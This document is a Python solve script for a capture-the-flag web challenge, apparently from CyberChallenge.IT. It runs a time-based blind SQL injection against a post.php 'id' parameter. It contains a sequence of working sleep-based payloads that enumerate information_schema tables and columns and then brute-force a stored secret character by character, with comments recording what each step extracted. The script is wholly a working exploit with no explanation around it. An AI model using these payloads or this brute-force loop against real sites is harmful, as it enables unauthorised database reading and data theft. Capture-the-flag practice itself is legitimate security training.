#!/bin/env python
import requests
import time
from string import printable, ascii_letters, ascii_uppercase, ascii_lowercase, digits, Template

class Inj:

    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/'.format(host)

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }

    def web_url(self, query):
        url = self.base_url + "post.php"
        payload = {'id':query}
        return self.sess.get(url, params=payload)

def bruteforce_str_time(sql_query, time_len, inj_obj, initial_str):

    cur_str = initial_str
    ind = len(cur_str)+1

    while(True):

        changed = False

        for j in printable:

            cur_query = sql_query.format(1, ind, cur_str + j)
            pre_inj_time = time.time()
            res = inj_obj.web_url(cur_query)
            post_inj_time = time.time()

            if(post_inj_time - pre_inj_time > time_len):
                cur_str += j
                ind += 1
                changed = True
                print(cur_str)
                break

        if(changed == False):
            break

    return cur_str


inj = Inj('http://filtered.challs.cyberchallenge.it')
wait_time = 2

#Obtained id, now, play, title
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not (table_schema != database() or (binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="information_schema.columns", \
            d2="column_name")

#Obtained flaggy, posts
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not (table_schema != database() or (binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="information_schema.columns", \
            d2="table_name")

#Obtained now, play
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not (table_name != 'flaggy' or table_schema != database() or (binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="information_schema.columns", \
            d2="column_name")

#Obtained body, id, title
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not (table_name != 'posts' or table_schema != database() or (binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="information_schema.columns", \
            d2="column_name")

#Try to find hidden flag* table: no hidden table
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not (table_schema != database() or (binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="information_schema.columns", \
            d2="table_name")

#No views, no routines, no files, parameters, events, collations, 
query = Template("' or (select sleep($t1) from $d1 where " \
    + "not ((binary substr($d2, {}, {}) != '{}'))) = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="flaggy", \
            d2="now")

#The column play contains: fix and r4ndom
#The column now contains: 'me pls'
print(query)
bruteforce_str_time(query, wait_time, inj, "This time your secret is ")
